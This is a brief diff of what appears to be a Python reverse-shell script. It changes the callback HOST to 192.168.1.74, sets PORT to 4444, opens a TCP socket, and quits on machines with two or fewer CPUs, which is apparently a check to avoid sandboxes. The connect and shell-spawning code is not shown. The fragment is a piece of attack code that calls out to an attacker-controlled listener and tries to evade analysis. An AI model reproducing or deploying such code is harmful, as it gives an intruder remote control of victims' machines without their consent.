@@ -6,7 +6,7 @@ import subprocess
 if os.cpu_count() <= 2:
     quit()
 
-HOST = '192.168.1.14'
+HOST = '192.168.1.74'
 PORT = 4444
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
